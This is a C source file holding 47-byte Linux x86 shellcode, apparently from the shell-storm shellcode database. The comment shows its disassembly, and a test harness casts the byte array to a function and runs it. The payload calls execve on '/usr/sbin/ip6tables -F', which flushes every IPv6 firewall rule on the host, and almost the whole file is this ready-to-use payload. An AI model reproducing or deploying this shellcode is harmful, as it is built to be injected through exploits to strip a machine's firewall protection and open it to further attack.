/*  Linux x86 - ip6tables -F - 47 bytes
 *  Jonathan Salwan < submit [!] shell-storm.org >
 *
 *	! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ !
 *
 *
 *  The Gnuser Project (Gnu Users Manager) => http://www.gnuser.org
 *
 * Disassembly of section .text:
 *
 * 08048054 <.text>:
 * 8048054:	6a 0b                	push   $0xb
 * 8048056:	58                   	pop    %eax
 * 8048057:	99                   	cltd
 * 8048058:	52                   	push   %edx
 * 8048059:	66 68 2d 46          	pushw  $0x462d
 * 804805d:	89 e1                	mov    %esp,%ecx
 * 804805f:	52                   	push   %edx
 * 8048060:	6a 73                	push   $0x73
 * 8048062:	66 68 6c 65          	pushw  $0x656c
 * 8048066:	68 36 74 61 62       	push   $0x62617436
 * 804806b:	68 6e 2f 69 70       	push   $0x70692f6e
 * 8048070:	68 2f 73 62 69       	push   $0x6962732f
 * 8048075:	68 2f 75 73 72       	push   $0x7273752f
 * 804807a:	89 e3                	mov    %esp,%ebx
 * 804807c:	52                   	push   %edx
 * 804807d:	51                   	push   %ecx
 * 804807e:	53                   	push   %ebx
 * 804807f:	89 e1                	mov    %esp,%ecx
 * 8048081:	cd 80                	int    $0x80
*/

#include <stdio.h>

int main(int argc, char *argv[])
{
char shellcode[] = 	"\x6a\x0b\x58\x99\x52\x66\x68\x2d"
			"\x46\x89\xe1\x52\x6a\x73\x66\x68"
			"\x6c\x65\x68\x36\x74\x61\x62\x68"
			"\x6e\x2f\x69\x70\x68\x2f\x73\x62"
			"\x69\x68\x2f\x75\x73\x72\x89\xe3"
			"\x52\x51\x53\x89\xe1\xcd\x80";

       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}